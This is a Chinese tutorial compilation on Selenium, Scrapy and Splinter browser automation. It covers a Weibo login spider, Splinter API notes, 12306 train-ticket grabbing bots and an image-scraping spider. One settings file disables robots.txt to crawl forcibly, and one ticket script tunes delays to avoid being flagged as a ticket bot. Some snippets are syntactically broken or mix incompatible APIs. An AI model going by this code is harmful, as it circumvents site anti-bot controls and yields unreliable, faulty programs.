Selenium是一个自动化测试框架,它能做的就是把从页面上的操作转化为代码,你能在页面上做什么就能用selenium提供的接口方法去操作web页面
Selenium本身与爬虫并没有多大的关系,Selenium开始主要是作为Web应用的自动化测试工具来使用的,Selenium开始是用Java写成的。Selenium可以驱动浏览器对Web应用进行测试,就像真正的用户在使用浏览器测试Web应用一样。后来的爬虫程序正是借助于Selenium的这个功能来驱动浏览器登录Web应用的。

为了在Python程序中使用Selenium启动Firefox浏览器,并驱动Firefox浏览目标网站,需要以下3步:
1、为Python安装Selenium库:pip install selenium

2、为Selenium下载对应的浏览器驱动。Selenium支持Chrome、Firefox、Edge、Safari等各种主流的浏览器,https://selenium-python.readthedocs.io/installation.html#drivers提供各浏览器驱动的下载链接。
Chrome浏览器驱动taobao备用地址https://npm.taobao.org/mirrors/chromedriver
https://chromedriver.storage.googleapis.com/index.html
这里将驱动Firefox来模拟登录,因此通过其页面的链接来下载Firefox对应的驱动,32位操作系统下载32位的驱动,64位操作系统下载64位的驱动,解压下载的压缩包将得到一个geckodriver.exe文件,可以将该文件放在任意目录下,本项目将该驱动文件直接放在项目目录下。
可将浏览器驱动文件下载到python的安装目录即自动添加到path

3、安装目标浏览器。比如本项目需要启动Firefox浏览器,那么就需要在目标机器上安装Firefox浏览器,还应该将Firefox浏览器的可执行程序(firefox.exe)所在的目录添加到PATH环境变量中,以便Selenium能找到该浏览器。

</pre><textarea>
from selenium import webdriver
import time
# 通过executable_path指定浏览器驱动的路径
browser = webdriver.Firefox(executable_path="WeiboSpider/geckodriver.exe")
browser = webdriver.Chrome(executable_path="chromedriver.exe")
# 等待3秒,用于等待浏览器启动完成
time.sleep(3)
# 浏览指定网页
browser.get("http://c.biancheng.net")
# 暂停5秒
time.sleep(5)

</textarea><pre>
在成功安装了Selenium、驱动及目标浏览器之后,接下来在Scrapy项目中整合Selenium,通过Scrapy+Selenium来登录weibo.com。

首先创建Scrapy项目:
scrapy startproject WeiboSpider
然后进入WeiboSpider目录下(不要进入WeiboSpider\WeiboSpider目录下),执行如下命令来生成Spider类:
scrapy genspider weibo_post "weibo.com"
上面两个命令执行完成后,一个简单的Scrapy项目就创建好了。
接下来需要修改WeiboSpider\items.py、WeiboSpider\pipelines.py、WeiboSpider\spiders\weibo_post.py、WeiboSpider\settings.py文件,将它们全部改为使用UTF-8字符集来保存。

本项目不再重复介绍使用Scrapy爬取普通文本内容的方法,而是重点介绍在Scrapy项目中整合Selenium的方法,因此不需要修改items.py和pipelines.py文件。
本项目直接修改weibo_post.py文件,在Spider类中整合Selenium调用Firefox登录weibo.com,接下来爬虫程序即可利用登录后的Cookie数据来访问weibo内容。

使用Selenium调用Firefox登录weibo.com,首先要对weibo.com的登录页面进行分析:
weibo的登录页面是:https://weibo.com/login/
在登录页面中输入用户名的文本框是://input[@id="loginname"]节点
在登录页面中输入密码的文本框是://input[@type="password"]节点
在登录页面中登录按钮是://a[@node-type="submitBtn"]节点。
通过分析得到以上内容之后,接下来可以在Spider类中额外定义一个方法来使用Selenimn调用Firefox登录weibo.com

</pre><textarea>
import scrapy
from selenium import webdriver
import time

class WeiboPostSpider(scrapy.Spider):
    name = 'weibo_post'
    allowed_domains = ['weibo.com']
    start_urls = ['http://weibo.com/']

    def __init__(self):
        self.login_cookies = []  # 定义保存登录成功之后的cookie的变量

    # 定义发送请求的请求头
    headers = {
        "Referer": "https://weibo.com/login/",
        'User-Agent': "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
    }

    def get_cookies(self):
        '''使用Selenium模拟浏览器登录并获取cookies'''
        cookies = []
        browser = webdriver.Firefox(executable_path="geckodriver.exe")
        time.sleep(3)                                                          # 等待3秒,用于等待浏览器启动完成
        browser.get("https://weibo.com/login/")                                # 控制Firefox打开weibo.com的登录页面
        elem_user = browser.find_element_by_xpath('//input[@id="loginname"]')  # 获取输入用户名的文本框
        elem_user.send_keys('xxxxxx@sina.com')                                 # 模拟输入用户名
        elem_pwd = browser.find_element_by_xpath('//input[@type="password"]')  # 获取输入密码的文本框
        elem_pwd.send_keys('yyyyyy')                                           # 模拟输入密码
        commit = browser.find_element_by_xpath('//a[@node-type="submitBtn"]')  # 获取提交按钮
        commit.click()                                                         # 模拟单击提交按钮
        time.sleep(10)                                                         # 暂停10秒,等待浏览器登录完成
        if "微博-随时随地发现新鲜事" in browser.title:                           # 登录成功后获取cookie
            self.login_cookies = browser.get_cookies()
        else:
            print("登录失败！")

    # start_requests方法会在parse方法之前执行,该方法可用于处理登录逻辑。
    # start_request(self)方法会在Scrapy发送请求之前执行,该方法中调用self.get_cookies()方法来登录weibo.com,并保存登录之后的Cookie数据,这样该爬虫程序即可成功访问登录之后的个人主页页面
    def start_requests(self):
        self.get_cookies()
        print('=====================', self.login_cookies)
        # 开始访问登录后的内容
        return [scrapy.Request(
            'https://weibo.com/cyuyanzhongwenwang/',
            headers=self.headers,
            cookies=self.login_cookies,
            callback=self.parse
        )]

    # 解析服务器响应的内容,parse(self, response)方法并未yield item,只是简单地判断了response中是否包含登录账号信息,因为本项目只是示范在Scrapy项目中如何整合Selenium进行登录
    def parse(self, response):
        print('~~~~~~~parse~~~~~')
        print("是否解析成功:", in response.text)

</textarea>接下来对settings.py文件增加一些自定义请求头模拟浏览器,设置启用指定的Pipeline<textarea>
BOT_NAME = 'WeiboSpider'

SPIDER_MODULES = ['WeiboSpider.spiders']
NEWSPIDER_MODULE = 'WeiboSpider.spiders'

# 指定该爬虫程序不遵守该站点下的robot.txt规则文件(Scrapy默认遵守robot.txt规则文件),强行爬取该站点的内容
ROBOTSTXT_OBEY = False

# 配置默认的请求头
DEFAULT_REQUEST_HEADERS = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
}

# 配置使用Pipeline
ITEM_PIPELINES = {
    'WeiboSpider.pipelines.WeibospiderPipeline': 300,
}

</textarea><pre>
经过上面配置,接下来在WeiboSpider目录下执行如下命令来启动爬虫。
scrapy crawl weibo_post

从该爬虫程序的运行过程来看,整合Selenium之后Scrapy的运行速度明显慢了很多。因此Scrapy通常只使用Selenium控制浏览器执行登录,不会使用Selenium控制浏览器执行普通下载,普通下载使用Scrapy自己的下载中间件效率更高

只要技术到位,网络上没有爬取不到的数据。当然如果有些网站的数据属于机密数据,并且这些网站也已经采取种种措施来阻止非法访问,但非要越过层层限制去访问这些数据就涉嫌触犯法律了,因此爬虫也要适可而止。

</pre>

<h4>Splinter</h4><pre>
pip install splinter
中文文档https://splinter-docs-zh-cn.readthedocs.io/zh/latest/

Splinter是用Python开发的一个开源web自动化测试的工具集,可自动化浏览器的行为,如浏览URLs并和页面进行交互,实现web浏览器自动操作,模拟点击等一系列操作
Splinter是现有浏览器之上抽象层自动化工具(如Selenium, PhantomJS和zope.testbrowser)。它具有高级API,这使得它很容易去编写Web应用程序的自动化测试

splinter在selenium之上又封装了一层,使得接口更为简单。
splinter只有在使用浏览器的时候才需要安装selenium,如果仅仅是在flask或django中进行测试是不需要的
splinter的优势就是小巧方便,api函数简洁明了,同时缺点也比较突出,无法支持复杂的浏览器操作,如模拟移动端的touch事件

支持多种webdriver
支持css和xpath选择器
支持iframe和alert
可执行javascript脚本
支持ajax和异步javascript

splinter支持三种驱动程序：chrome,firefox和zopetestbrowser
在Splinter中使用Google Chrome,需要使用Selenium 2.3.x, 同时确保正确安装Chrome webdriver
browser = Browser('chrome')
browser = Browser('firefox')
browser = Browser('zope.testbrowser')

可以在自定义路径中使用Chrome,不过需要将可执行路径作为字典传递给**kwargs参数. 将executable_path作为字典的key值,将可执行文件的路径设置为字典的Value。
from splinter import Browser
executable_path = {'executable_path':'< /path/to/chrome>'}
browser = Browser('chrome', **executable_path)

用Browser.visit浏览、导航到其他页面：
browser.visit('https://baidu.com')
通过在URL中提供用户名和密码来访问受HTTP身份验证保护的站点
browser.visit('http://username:password@xxxx.xx/protected')

管理页面窗口
可以通过Windows对象来管理多个窗口(如弹出窗口)：
browser.windows              # 获取全部窗口
browser.windows[0]           # 获取第一个窗口
browser.windows[window_name] # 获取指定窗口名的窗口
browser.windows.current      # 获取当前窗口
browser.windows.current = browser.windows[3]  # 设置当前窗口索引号为3

window = browser.windows[0]
window.is_current            # 布尔判断 - 窗口是否为当前活动窗口
window.is_current = True     # 设置窗口为当前窗口
window.next                  # 下一个窗口
window.prev                  # 上一个窗口
window.close()               # 关闭窗口
window.close_others()        # 关闭所有其他窗口

重新加载页面
browser.reload()

浏览历史
可以使用back和forward方法来浏览历史记录:
browser.visit('http://cobrateam.info')
browser.visit('https://splinter.readthedocs.io')
browser.back()
browser.forward()

Browser.title
可以使用以下title属性获取访问页面的标题：
browser.title

使用Browser.html验证页面内容
可以使用该html属性来获取访问页面的html内容：
browser.html

使用Browser.url验证页面网址
访问页面的URL可以通过url属性访问：
browser.url

更改浏览器User-Agent
可以在浏览器实例化时传递User-Agent。
b = Browser(user_agent="Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en)")

【 查找元素 】
Splinter提供了6种方法用于查找在页面中的元素
browser.find_by_css('h1')
browser.find_by_xpath('//h1')
browser.find_by_tag('h1')
browser.find_by_name('name')
browser.find_by_text('Hello World!')
browser.find_by_id('firstheader')
browser.find_by_value('query')

这些方法中的每一个返回一个包含已找到元素的列表,可以使用first快捷方式获取第一个找到的元素：
first_found = browser.find_by_name('name').first
还有last快捷方式返回最后发现的目标元素：
last_found = browser.find_by_name('name').last
还可以使用索引在所找到的元素列表中获取所需的元素：
second_found = browser.find_by_name('name')[1]

所有元素和find_by_id
一个网页应该只有一个id,所以该find_by_id方法总是只返回一个元素的列表。

【 查找链接 】
如果需要找到一个页面的链接,可以使用以下方法：
links_found = browser.find_link_by_text('Link for Example.com')
links_found = browser.find_link_by_partial_text('for Example')
links_found = browser.find_link_by_href('http://example.com')
links_found = browser.find_link_by_partial_href('example')

作为其他find_*方法,它们返回所有找到的元素的列表。

还可以搜索使用其他类型的选择与方法： find_by_css, find_by_xpath, find_by_tag, find_by_name, find_by_value 和 find_by_id.

【 链式查找元素 】
查找方法是可链式的,因此可以找到先前发现的元素的后续属性。
divs = browser.find_by_tag("div")
within_elements = divs.first.find_by_name("name")

【 ElementDoesNotExist异常处理 】
如果未找到元素则find_*返回空列表,但尝试访问此列表中的元素将触发splinter.exceptions.ElementDoesNotExist异常。

【 鼠标交互 】
大部分鼠标交互目前仅适用于Chrome driver和火狐浏览器27.0.1
Splinter提供了一些鼠标与页面元素交互的方法,该功能有助于测试一个元素是否在鼠标移来时出现移走时消失例如：子菜单
也可以对这个元素执行单击,双击或者右击操作。

假设有这样一个jQuery方法让鼠标移过来、移走:
$('.menu-links').mouseover(function(){
    $(this).find('.subitem').show();
});

$('.menu-links').mouseout(function(){
    $(this).find('.subitem').hide();
});
可以使用 Splinter 通过程序触发事件：
browser.find_by_css('.menu-links').mouse_over()
# 检测子菜单是否出现...
browser.find_by_css('.menu-links').mouse_out()
browser.find_by_tag('h1').click()        # 单击
browser.find_by_tag('h1').double_click() # 双击
browser.find_by_tag('h1').right_click()  # 右击

将h1元素拖放到容器元素中
draggable = browser.find_by_tag('h1')
target = browser.find_by_css('.container')
draggable.drag_and_drop(target)

【 与页面中的元素交互 】
通过value属性获取元素的内容
browser.find_by_css('h1').first.value
element = browser.find_by_css('h1').first
element.value

通过href、partial href、text or partial text来点击链接,这些方法永远返回获取到得第一个链接
browser.click_link_by_href('http://www.the_site.com/my_link')
browser.click_link_by_partial_href('my_link')
browser.click_link_by_text('my link')
browser.click_link_by_partial_text('part of link text')
browser.click_link_by_id('link_id')

点击按钮
Splinter支持点击按钮后的重定向和提交表单。
browser.find_by_name('send').first.click()
browser.find_link_by_text('my link').first.click()

表单交互
browser.fill('query', 'my name')
browser.attach_file('file', '/path/to/file/somefile.jpg')
browser.choose('some-radio', 'radio-value')
browser.check('some-check')
browser.uncheck('some-check')
browser.select('uf', 'rj')

要使用Splinter填写表单字段：
browser.fill('username', 'janedoe')
在Selenium中等效代码为：
elem = browser.find_element.by_name('username')
elem.send_keys('janedoe')

可以使用type方法触发按下键或者按上键的js事件
browser.type('type', 'typing text')

If you pass the argument slowly=True to the type method you can interact with the page on every key pressed. Useful for testing field's autocompletion (the browser will wait until next iteration to type the subsequent key).

for key in browser.type('type', 'typing slowly', slowly=True):
    pass # make some assertion here with the key object :)

You can also use type and fill methods in an element:

browser.find_by_name('name').type('Steve Jobs', slowly=True)
browser.find_by_css('.city').fill('San Francisco')

检测元素是否可见
使用visible属性检测元素是否可见,如果元素可见会返回True,不可见则返回False
browser.find_by_css('h1').first.visible

Verifying if element has a className
To check if an element has a className, use the has_class method. For instance:
browser.find_by_css('.content').first.has_class('content')

Interacting with elements through a ElementList object
Don't you like to always use first when selecting an element for clicking, for example:
browser.find_by_css('a.my-website').first.click()

You can invoke any Element method on ElementList and it will be proxied to the first element of the list. So the two lines below are equivalent:
assert browser.find_by_css('a.banner').first.visible
assert browser.find_by_css('a.banner').visible

【 使用Matchers检测文本和元素是否存在于页面中 】
当使用AJAX和异步js时通常会出现HTML源代码中不存在的元素,它们是由js动态生成,在这种情况下可以使用is_element_present和is_text_present方法来检查元素或文本是否存在,Splinter将在浏览器中加载HTML和JS,并在运行js之前进行检查。

还有一个可选参数wait_time(以秒为单位)超时选项: 如果验证方法得到True它将返回结果,即使时间没有超过wait_time,如果没有得到True,该方法将等待直到时间超过wait_time,然后返回结果。

检查文本是否存在
is_text_present方法负责检查页面内容中是否存在特定文本。存在返回True,不存在返回False。
browser = Browser()
browser.visit('https://splinter.readthedocs.io/')
browser.is_text_present('splinter') # True
browser.is_text_present('splinter', wait_time=10) # True, using wait_time
browser.is_text_present('text not present') # False

还有一种方法来检查文本不存在 : is_text_not_present,工作原理相同相同,但如果文本不存在则返回True
browser.is_text_not_present('text not present') # True
browser.is_text_not_present('text not present', wait_time=10) # True, using wait_time
browser.is_text_not_present('splinter') # False

检查元素是否存在
Splinter提供了6种方法来检查页面元素是否存在,如果元素存在这些方法会返回True,否则返回False
browser.is_element_present_by_css('h1')
browser.is_element_present_by_xpath('//h1')
browser.is_element_present_by_tag('h1')
browser.is_element_present_by_name('name')
browser.is_element_present_by_text('Hello World!')
browser.is_element_present_by_id('firstheader')
browser.is_element_present_by_value('query')
browser.is_element_present_by_value('query', wait_time=10) # using wait_time

和is_text_present类似,上述方法也都存在着相反的方法:
browser.is_element_not_present_by_css('h6')
browser.is_element_not_present_by_xpath('//h6')
browser.is_element_not_present_by_tag('h6')
browser.is_element_not_present_by_name('unexisting-name')
browser.is_element_not_present_by_text('Not here :(')
browser.is_element_not_present_by_id('unexisting-header')
browser.is_element_not_present_by_id('unexisting-header', wait_time=10) # using wait_time

【 操控Cookies 】
可以通过Browser实例的cookies属性操控cookies。cookies属性是可以增加和删除cookie的CookieManager类的一个实例
browser.cookies.add({'whatever': 'and ever'}) # 创建cookie
browser.cookies.all() # 获取所有的cookies
browser.cookies.delete('mwahahahaha')  # 删除'mwahahahaha'这个cookie
browser.cookies.delete('whatever', 'wherever')  # 删除两个cookies
browser.cookies.delete()  # 删除所有的cookies

【 执行js 】
如果driver可执行js,那么可以通过下面的例子很方便地执行js代码：
browser.execute_script("$('body').empty()")
可以获取到执行脚本后返回的值:
browser.evaluate_script("4+4") == 8

【 处理HTTP状态代码 】
browser.visit('https://baidu.com')
browser.status_code.is_success() # True,如果获得重定向,status_code.is_success则会将您的响应视为成功
browser.status_code == 200 # True
browser.status_code.code # 200

【 处理HTTP异常 】
每当使用访问方法时,Splinter将检查响应是否成功,如果不是则会引发HttpResponseError异常,status_code和HTTP异常处理仅适用于selenium webdriver
try:
    browser.visit('http://cobrateam.info/i-want-cookies')
except HttpResponseError, e:
    print("Oops, I failed with the status code %s and reason %s" % (e.status_code, e.reason))

【 与iframes,alerts和prompts交互 】
使用iframes
可通过get_iframe方法和with声明与iframes进行交互,可向get_iframe方法传出iframe的name,id或index来获取iframe。

with browser.get_iframe('iframemodal') as iframe:
    iframe.do_stuff()

处理alerts和prompts
从Splinter0.4版本开始Chrome浏览器支持与alerts和prompts的交互,只FirefoChrom支持alertprompt进行交互。

可以使用get_alert方法来处理alerts和prompts
alert = browser.get_alert()
alert.text
alert.accept()
alert.dismiss()

对于prompts可以使用fill_with方法进行回复
prompt = browser.get_alert()
prompt.text
prompt.fill_with('text')
prompt.accept()
prompt.dismiss()

也可以使用with声明同时与alerts和prompts进行交互。
with browser.get_alert() as alert:
    alert.do_stuff()

如果页面没有prompt或alert,get_alert会返回None,至少要使用一个alert/prompt的结束方法(accept和dismiss),否则浏览器会处于休眠状态不能进行其他操作

</pre><textarea>
from splinter import Browser

# 如果不为Browser指定driver则默认使用firefox
# browser = Browser(driver_name='chrome')
# browser = Browser('chrome')
browser = Browser()
browser.visit('http://baidu.com')
browser.fill('wd', 'splinter - python acceptance testing for web applications')
button = browser.find_by_xpath('//input[@type="submit"]').click()

if browser.is_text_present('splinter.readthedocs'):
    print("Yes, the official website was found!")
else:
    print("No, it wasn't found... We need to improve our SEO techniques")

browser.quit()  # 关闭浏览器

</textarea><textarea>
from splinter import Browser

with Browser() as browser:
    url = "http://baidu.com"
    browser.visit(url)      # 访问百度搜索页面
    browser.fill('wd', 'splinter - python')                    # 用Splinter填写一个表单项,在百度搜索框中填充splinter - python
    button = browser.find_by_xpath('//input[@type="submit"]')  # 找到并点击搜索按钮
    button.click()          # 与元素交互

    if browser.is_text_present('splinter.readthedocs'):        # 查看Splinter官方网站是否在搜索结果中
        print("Yes, the official website was found!")
    else:
        print("No, it wasn't found... We need to improve our SEO techniques")

</textarea>12306自动抢票<textarea>
from splinter.browser import Browser
from time import sleep
# traceback模块被用来跟踪异常返回信息
import traceback
# 设定用户名、密码
username = u"用户名"
passwd = u"密码"
# 起始站点和乘车时间的cookies值要去找;
# 方法：先登录一下12306,输入地点日期什么的查询一下,然后在chrome浏览器中按F12,出现如下页面,在Application选项里找到相应的值。
# 表格中的cookie值：
#_jc_save_fromeStation的值为出发地
#_jc_save_toSatation的值为目的地
#_jc_save_fromDate 出发日期
#_jc_save_toDate返程日期
# 实例中用的是：福州 到 厦门北 2018-01-13
from_station = u"%u798F%u5DDE%2CFZS"
to_station = u"%u53A6%u95E8%u5317%2CXKS"
# 时间格式2018-01-25
from_date = u"2018-01-13"
# 车次,选择第几趟,0则从上之下依次点击
order = 0
# 设定乘客姓名
ticketer = u"乘客姓名"
# 设定网址
ticket_url = "https://kyfw.12306.cn/otn/leftTicket/init"
login_url = "https://kyfw.12306.cn/otn/login/init"
initmy_url = "https://kyfw.12306.cn/otn/index/initMy12306"

# 登录网站
def login():
    bwr.find_by_text(u"登录").click()             #点击当前页面的"登录"
    sleep(3)
    bwr.fill("loginUserDTO.user_name", username)  #fill填充搜索框的内容,username。name=loginUserDTO.user_name的元素。
    sleep(1)
    bwr.fill("userDTO.password", passwd)
    sleep(1)
    print(u"等待验证码,自行输入...")
    #登录手动输入验证码,并登录系统
    while True:
        #判断当前的url是否已经进入系统
        if bwr.url != initmy_url:
            sleep(1)
        else:
            break
# 购票
def getTickt():
    global bwr
    bwr=Browser(driver_name="chrome")  # 使用splinter打开chrome浏览器,安装chromedriver
    bwr.visit(ticket_url)              # splinter打开浏览器(返回购票页面)
    while bwr.is_text_present(u"登录"):
        sleep(1)
        login()
        #判断是否已经进入系统
        if bwr.url == initmy_url:
            break
    try:
        print(u"购票页面...")
        bwr.visit(ticket_url)         # splinter打开浏览器(跳回购票页面)
        # 加载查询信息
        bwr.cookies.add({"_jc_save_fromStation": from_station})
        bwr.cookies.add({"_jc_save_toStation": to_station})
        bwr.cookies.add({"_jc_save_fromDate": from_date})
        bwr.reload()
        sleep(2)
        count=0
        # 循环点击预订
        if order != 0:
            while bwr.url == ticket_url:
                bwr.find_by_text(u"查询").click()
                count += 1
                print(u"循环点击查询... 第 %s 次" % count)
                sleep(1)
                try:
                    bwr.find_by_text(u"预订")[order - 1].click()
                except:
                    print(u"还没开始预订")
                    continue
        else:
            while bwr.url == ticket_url:
                 bwr.find_by_text(u"查询").click()
                 count += 1
                 print(u"循环点击查询... 第 %s 次" % count)
                 sleep(1)
                 try:
                     for i in bwr.find_by_text(u"预订"):
                         i.click()
                         sleep(1)
                 except:
                     print(u"还没开始预订")
                     continue
        sleep(1)
        # 可以通过修改sleep的参数来调整延时, 但延时不要太低, 防止被12306网站认为是刷票屏蔽掉.
        bwr.find_by_text(ticketer)[0].click()
        sleep(1)
        bwr.find_by_text(u"提交订单").click()
        sleep(1)
        #bwr.find_by_id(u"qr_submit_id").click()
        print(u"成功抢到一张宝贵的票")
    except Exception as e:
         print(traceback.print_exc())

if __name__ == "__main__":
    getTickt()

</textarea>12306自动抢票<textarea>
# -*- coding: utf-8 -*-
from splinter.browser import Browser
from time import sleep
import time
import pygame
from selenium.webdriver.support.select import Select
from selenium import webdriver
from selenium.webdriver.support.select import Select

class ticket(object):
    username = u"用户名"
    passwd = u"密码"
    order = 0   # 车次,选择第几趟,0则从上之下依次点击
    ticket_url = "https://kyfw.12306.cn/otn/leftTicket/init"
    login_url = "https://kyfw.12306.cn/otn/login/init"
    initmy_url = "https://kyfw.12306.cn/otn/index/initMy12306"
    buy = "https://kyfw.12306.cn/otn/confirmPassenger/initDc"

    def login(self):
        self.driver.get(self.login_url)
        # 填充密码
        self.driver.find_element_by_name("loginUserDTO.user_name").send_keys(self.username)
        self.driver.find_element_by_name("userDTO.password").send_keys(self.passwd)
        print(u"等待验证码,自行输入...")
        print("开始登录")
        sleep(5)
        while True:
            if self.driver.current_url!= self.initmy_url:
                sleep(1)
            else:
                break
        print("结束登录")

    def start(self):
        self.driver = webdriver.Chrome()

        self.login()
        sleep(3)
        self.driver.get(self.ticket_url)
        try:
            print(u"购票页面开始...")
            self.driver.find_element_by_id("fromStationText").send_keys("长沙")
            self.driver.find_element_by_id("toStationText").send_keys("石门北")
            self.driver.find_element_by_id("train_date").send_keys("2018-03-28")

            # K-快速 Z-直达 D-动车 GC-高铁/城际 T-特快
            count = 0
            if self.order != 0:
                while self.driver.url == self.ticket_url:
                    self.driver.find_by_text(u"查询").click()
                    count += 1
                    print(u"点击查询... 第 %s 次" % count)
                    sleep(0.8)
                    try:
                        self.driver.find_by_text(u"预订")[self.order - 1].click()
                    except Exception as e:
                        print(e)
                        print(u"预订。。。")
                        continue
            else:
                while self.driver.url == self.ticket_url:
                    self.driver.find_by_text(u"查询").click()
                    count += 1
                    print(u"点击查询... 第 %s 次" % count)
                    sleep(0.8)
                    try:
                        for i in self.driver.find_by_text(u"预订"):
                            i.click()
                            sleep(1)
                    except Exception as e:
                        print(e)
                        print(u"预订 。。。")
                        continue
            print(u"开始预订...")
            sleep(3)

            sleep(1)
            print(u"开始选择用户...")
            self.driver.find_by_text(u"熊桐").last.click()

            print(u"提交订单...")
            sleep(1)
            time.sleep(60)
            self.driver.find_by_id('submitOrder_id').click()
            sleep(1.5)
            self.driver.find_by_id('qr_submit_id').click()
            pygame.mixer.init()
            print("订单完成,播放音乐提醒")
            track = pygame.mixer.music.load(file)
            pygame.mixer.music.play()
            time.sleep(60)
            pygame.mixer.music.stop()
        except Exception as e:
            print(e)

cities = {
    '北京': '%u5317%u4EAC%2CBJP',
    '广州': '%u5E7F%u5DDE%2CGZQ',
    '杭州': '%u676D%u5DDE%2CHZH',
    '深圳': '%u6DF1%u5733%2CSZQ',
    '武汉': '%u6B66%u6C49%2CWHN',
    '上海': '%u4E0A%u6D77%2CSHH',
    '长沙': '%u957F%u6C99%2CCSQ',
    '石门北': '%u77F3%u95E8%u53BF%u5317%2CVFQ'}
if __name__ == '__main__':
    file = r'.\PycharmProjects\untitled3\她说.mp3'
    ticket = ticket()
    ticket.starts = cities["长沙"]
    ticket.ends = cities["石门北"]
    ticket.dtime = "2018-03-28"
    ticket.start()

</textarea>实现自动抢火车票(基于Python3.6+splinter) Created on 2018年1月15日<textarea>
from splinter.browser import Browser
from time import sleep
import traceback

#实现自动购票的类
class Buy_Tickets(object):
    def __init__(self, username, passwd, order, passengers, dtime, starts, ends):
        self.username = username
        self.passwd = passwd
        self.order = order # 车次,0代表所有车次,依次从上到下,1代表所有车次,依次类推
        self.passengers = passengers # 乘客名
        self.starts = starts # 起始地
        self.ends = ends # 终点
        self.dtime = dtime # 日期
        # self.xb = xb
        # self.pz = pz
        self.login_url = 'https://kyfw.12306.cn/otn/login/init'
        self.initMy_url = 'https://kyfw.12306.cn/otn/index/initMy12306'
        self.ticket_url = 'https://kyfw.12306.cn/otn/leftTicket/init'
        self.driver_name = 'chrome'
        self.executable_path = 'C:\Python36\Scripts\chromedriver.exe'
    # 登录功能实现
    def login(self):
        self.driver.visit(self.login_url)
        self.driver.fill('loginUserDTO.user_name', self.username)
        sleep(1)
        self.driver.fill('userDTO.password', self.passwd)
        sleep(1)
        print('请输入验证码...')
        while True:
            if self.driver.url != self.initMy_url:
                sleep(1)
            else:
                break
    # 买票功能实现
    def start_buy(self):
        self.driver = Browser(driver_name=self.driver_name, executable_path=self.executable_path)
        self.driver.driver.set_window_size(700, 500) #窗口大小的操作
        self.login()
        self.driver.visit(self.ticket_url)
        try:
            print('开始购票...')
            # 加载查询信息
            self.driver.cookies.add({"_jc_save_fromStation": self.starts})
            self.driver.cookies.add({"_jc_save_toStation": self.ends})
            self.driver.cookies.add({"_jc_save_fromDate": self.dtime})
            self.driver.reload()
            count = 0
            if self.order != 0:
                while self.driver.url == self.ticket_url:
                    self.driver.find_by_text('查询').click()
                    count += 1
                    print('第%d次点击查询...' % count)
                    try:
                        self.driver.find_by_text('预订')[self.order-1].click()
                        sleep(1.5)
                    except Exception as e:
                        print(e)
                        print('预订失败...')
                        continue
            else:
                while self.driver.url == self.ticket_url:
                    self.driver.find_by_text('查询').click()
                    count += 1
                    print('第%d次点击查询...' % count)
                    try:
                        for i in self.driver.find_by_text('预订'):
                            i.click()
                            sleep(1)
                    except Exception as e:
                        print(e)
                        print('预订失败...')
                        continue
            print('开始预订...')
            sleep(1)
            print('开始选择用户...')
            for p in self.passengers:
                self.driver.find_by_text(p).last.click()
                sleep(0.5)
                if p[-1] == ')': self.driver.find_by_id('dialog_xsertcj_ok').click()
            print('提交订单...')
            # sleep(1)
            # self.driver.find_by_text(self.pz).click()
            # sleep(1)
            # self.driver.find_by_text(self.xb).click()
            # sleep(1)
            self.driver.find_by_id('submitOrder_id').click()
            sleep(2)
            print('确认选座...')
            self.driver.find_by_id('qr_submit_id').click()
            print('预订成功...')
        except Exception as e:
            print(e)

if __name__ == '__main__':
    username = 'xxxx'
    password = 'xxx'
    order = 2 # 车次选择,0代表所有车次
    passengers = ['刘亚壮'] # 乘客名,比如passengers = ['XXX', 'XXX'],学生票需注明,注明方式为：passengers = ['XXX(学生)', 'XXX']
    dtime = '2018-01-20' # 日期,格式为：'2018-01-20'
    starts = '%u6210%u90FD%2CCDW' # 出发地(需填写cookie值)成都
    ends = '%%u5317%u4EAC%u897F%2CBXP' # 目的地(需填写cookie值)#北京
    # xb =['硬座座']
    # pz=['成人票']
    Buy_Tickets(username, password, order, passengers, dtime, starts, ends).start_buy()

</textarea>爬取mzitu图片<textarea>
###
# -*- coding: utf-8 -*-
import scrapy
from scrapy.http import Request
from scrapy.selector import Selector,XmlXPathSelector
from ..items import MzituItem

class MeizituSpider(scrapy.Spider):
    name = 'meizitu'
    allowed_domains = ['mzitu.com']
    # start_urls = ['http://mzitu.com/']

    def start_requests(self):
        url = 'http://www.mzitu.com/all/'
        yield Request(url=url,method='GET',callback=self.main_page)

    def main_page(self,response):
        # 取得所有套图地址
        hxs = Selector(response = response).xpath('//p[contains(@class,"url")]/a/@href').extract()
        for url in hxs:
            req = Request(url = url,
                          callback=self.fenye)
            yield req

    def fenye(self,response):
        # 取得图片路径和标题
        img_url = Selector(response=response).xpath('//div[@class="main-image"]//img/@src').extract_first().strip()
        title = Selector(response=response).xpath('//div[@class="main-image"]//img/@alt').extract_first().strip()
        yield MzituItem(img_url=img_url,title=title)
        # 取得下方导航条页面路径
        xhs = Selector(response=response).xpath('//div[@class="pagenavi"]/a/@href').extract()
        for url in xhs:
            req = Request(
                url=url,
                callback=self.fenye,
            )
            yield req

###
import scrapy
class MzituItem(scrapy.Item):
    # define the fields for your item here like:
    img_url = scrapy.Field()
    title = scrapy.Field()

###
from scrapy.exceptions import DropItem
import requests,os
base_path = 'F:\mzitu'
class MzituPipeline(object):
    def process_item(self, item, spider):
        # print(item['title'],item['img_url'])
        title = item['title']
        url = str(item['img_url'])
        if os.path.exists(os.path.join(base_path,item['title'])):
            pass
        else:
            os.makedirs(os.path.join(base_path,item['title']))
        dict = url.rsplit('/', maxsplit=1)
        file_name = os.path.join(base_path,title,dict[1])

        if os.path.exists(file_name):
            pass
        else:
            response = requests.get(url=url, headers={'Referer': 'http://www.mzitu.com/net/'})
            print('正在下载', title, '......')
            with open(file_name,'wb') as f:
                f.write(response.content)
            print('下载完成.')
        raise DropItem()

###
ITEM_PIPELINES = {
   'mzitu.pipelines.MzituPipeline': 300,
}

#去重,以及设定深度
DEPTH_LIMIT = 3
DUPEFILTER_CLASS = 'scrapy.dupefilter.RFPDupeFilter'
DUPEFILTER_DEBUG = False

###
# -*- coding: utf-8 -*-

# Scrapy settings for step8_king project
#
# For simplicity, this file contains only settings considered important or
# commonly used. You can find more settings consulting the documentation:
#
#     http://doc.scrapy.org/en/latest/topics/settings.html
#     http://scrapy.readthedocs.org/en/latest/topics/downloader-middleware.html
#     http://scrapy.readthedocs.org/en/latest/topics/spider-middleware.html

# 1. 爬虫名称
